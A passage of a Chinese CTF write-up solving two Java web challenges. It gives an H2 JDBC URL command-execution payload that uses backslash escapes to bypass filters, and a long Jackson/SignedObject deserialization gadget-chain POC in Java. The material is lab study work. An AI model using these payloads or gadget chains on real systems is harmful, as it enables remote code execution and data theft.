class="string">&quot;/401.jsp&quot;</span>).build());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isBaseFile</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !path.contains(<span class="string">&quot;/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续看这个JDBC如何利用，很明显打H2 JDBC RCE就行，但这里环境是jdk17，高版本JDK失去了Nashorn，于是需要通过非javascript的方式执行命令，例如，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;\;CALL EXEC (&#x27;open -a calculator&#x27;)\;</span><br></pre></td></tr></table></figure></div>

<p>但是传入的jdbcUrl拼接了一个<code>;FORBID_CREATION=TRUE</code>这个是限制禁止创建数据库，从而使攻击者同样不能再使用In-Memory内存数据库，因为使用内存数据库也是在“创建”数据库。参考<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html" >https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 需要将分号使用反斜线转义，分号就会变成一个普通字符串。</p>
<p>所以，我们可以在JDBC URL字符串最末尾增加一个反斜线，转义<code>;FORBID_CREATION=TRUE</code>最前面的分号，就可以让这个属性失效，得到payload为，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;\;CALL EXEC (&#x27;open -a calculator&#x27;)\;;AUTHZPWD=\</span><br></pre></td></tr></table></figure></div>

<p>到这还没结束，在连接前还有个过滤危险参数的<code>validateJdbcUrl()</code>函数，将传入的连接字符串进行大写转换后匹配，看似已经堵死了，但上面我们不是提到了反斜杠<code>\</code>可以转义嘛，于是可以利用命令执行绕过的思路，转义危险参数中的某个字母，比如<code>INI\T</code>，这个trick是从 <a class="link"   target="_blank" rel="noopener" href="https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6" >https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 得到的思路（这里我没细看底层逻辑，感兴趣可以自行跟一下）</p>
<p>最终怎么拿flag呢，这里虽然没有回显，但是如果靶机出网直接反弹shell或者外带数据都可以的，不出网的情况呢，这里可以写数据到webapps下的jsp文件了，就可以直接访问拿到数据，最终构造出payload为</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/testConnect;.</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Authorization</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=<span class="number">3</span>;INI\T=<span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> EXEC <span class="keyword">AS</span> <span class="string">&#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;</span>\;<span class="keyword">CALL</span> EXEC (<span class="string">&#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4gJENBVEFMSU5BX0hPTUUvd2ViYXBwcy9ST09ULzQwNC5qc3A\=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)\;;AUTHZPWD=\</span></span><br></pre></td></tr></table></figure></div>

<p>然后访问不存在的路径或访问404.jsp即可读取到flag</p>
<h2 id="题目-再短一点点"><a href="#题目-再短一点点" class="headerlink" title="题目-再短一点点"></a>题目-再短一点点</h2><ol>
<li>反编译jar，分析源码。</li>
</ol>
<p>idea反编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/image-20250913114932403.png"
                      alt="image-20250913114932403"
                ></p>
<p>查看MyController，有两个主要路由，一个是&#x2F;flag路由，是用来获取flag的，这里面判断根目录是否有个名为a的文件存在，如果存在，就返回”Good luck~”，如果不存在，就读取&#x2F;flag，然后输出。(我这里是本地，所以我换了文件路径)</p>
<p>第二个路由是&#x2F;deser，很明显的反序列化接口，需要post传入payload，然后判断payload长度是否大于1282。如果不大于，那就base64解码，然后经过InflaterInputStream解码，然后传到MyObjectInputStream里反序列化。</p>
<p>那这里肯定是需要通过&#x2F;deser路由来执行命令，删除根目录的a文件，然后访问&#x2F;flag路由获取flag。</p>
<p>我们再来看看MyObjectInputStream怎么写的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/image-20250913114956075.png"
                      alt="image-20250913114956075"
                ></p>
<p>这里主要是过滤了三个包，第一个主要过滤TemplatesImpl类，这个类我们需要用来rce。</p>
<p>第二个主要过滤javax.management.BadAttributeValueExpException类，这个类常用来触发toString进而触发POJONode#toString -&gt; getter-&gt;TemplatesImpl.getOutputProperties，也是CC5的入口点(当然这题没有CC依赖)。</p>
<p>第三个过滤了最近一条aop链，这里不重要。</p>
<ol>
<li>利用链构造和分析</li>
</ol>
<p>查看lib</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/image-20250913120116218.png"
                      alt="image-20250913120116218"
                ></p>
<p>发现存在jackson依赖，这里过滤了TemplatesImpl类，肯定是要打二次反序列化的。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://infernity.top/2025/03/05/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#poc-1" >https://infernity.top/2025/03/05/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#poc-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://infernity.top/2025/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >https://infernity.top/2025/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>用这篇文章，这里直接给了二次反序列化链的poc。</p>
<p>但是我们需要根据题目改几个地方，首先是序列化的地方，由于题目使用了InflaterInputStream解压输入流，那我们写序列化的时候需要压缩输出流。这里需要用DeflaterOutputStream。给出完整的serialize方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 Deflater 设置为最高压缩率</span></span><br><span class="line">    <span class="type">Deflater</span> <span class="variable">deflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>(Deflater.BEST_COMPRESSION);</span><br><span class="line">    <span class="type">DeflaterOutputStream</span> <span class="variable">deflaterOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeflaterOutputStream</span>(byteArrayOutputStream, deflater);</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(deflaterOutputStream);</span><br><span class="line">    objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭流</span></span><br><span class="line">    objectOutputStream.flush();</span><br><span class="line">    deflaterOutputStream.finish();</span><br><span class="line">    deflaterOutputStream.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为 Base64 字符串</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    <span class="keyword">return</span> poc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后就是触发tostring的地方，由于SignedObject二次反序列化也需要触发toString。所以BadAttributeValueExpException类我们是一定用不了的，肯定要找个其他可以触发toString的办法。</p>
<p>网上还有条老链子，EventListenerList这条链子来触发toString。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">            <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">    <span class="keyword">return</span> field.get(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一条JDK toString链 readObject-&gt;toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> EventListenerList <span class="title function_">getEventListenerList</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">    <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">    vector.add(obj);</span><br><span class="line"></span><br><span class="line">    setValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">    <span class="keyword">return</span> eventListenerList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那现在的poc就是：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> GFCTF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.DeflaterOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        overrideJackson();</span><br><span class="line">        <span class="type">byte</span>[] bytes = getshortclass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> (TemplatesImpl) getTemplates(bytes);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> getPOJONodeStableProxy(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(obj);</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> getEventListenerList(pojoNode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//二次反序列化</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> second_serialize(eventListenerList);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList2</span> <span class="operator">=</span> getEventListenerList(pojoNode2);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> serialize(eventListenerList2);</span><br><span class="line">        System.out.println(a.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//一条JDK toString链 readObject-&gt;toString</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> EventListenerList <span class="title function_">getEventListenerList</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(obj);</span><br><span class="line"></span><br><span class="line">        setValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">        <span class="keyword">return</span> eventListenerList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SignedObject <span class="title function_">second_serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException &#123;</span><br><span class="line">         <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">         kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">         <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">         <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">         <span class="keyword">return</span> signedObject;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//获取进行了动态代理的templatesImpl，保证触发getOutput</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPOJONodeStableProxy</span><span class="params">(Object templatesImpl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">         Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">         Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">         cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">         advisedSupport.setTarget(templatesImpl);</span><br><span class="line">         <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">         <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">         <span class="keyword">return</span> proxyObj;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//重写jackson</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">overrideJackson</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">         <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">         <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">         ctClass.removeMethod(writeReplace);</span><br><span class="line">         ctClass.toClass();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">         <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">         field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         field.set(obj, value);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">         setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">         setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Infernity&quot;</span>);</span><br><span class="line">         setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">         <span class="keyword">return</span> templates;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 提供需要序列化的类，返回base64后的字节码</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">         <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// 使用 Deflater 设置为最高压缩率</span></span><br><span class="line">         <span class="type">Deflater</span> <span class="variable">deflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>(Deflater.BEST_COMPRESSION);</span><br><span class="line">         <span class="type">DeflaterOutputStream</span> <span class="variable">deflaterOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeflaterOutputStream</span>(byteArrayOutputStream, deflater);</span><br><span class="line"> </span><br><span class="line">         <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(deflaterOutputStream);</span><br><span class="line">         objectOutputStream.writeObject(obj);</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// 关闭流</span></span><br><span class="line">         objectOutputStream.flush();</span><br><span class="line">         deflaterOutputStream.finish();</span><br><span class="line">         deflaterOutputStream.close();</span><br><span class="line"> </span><br><span 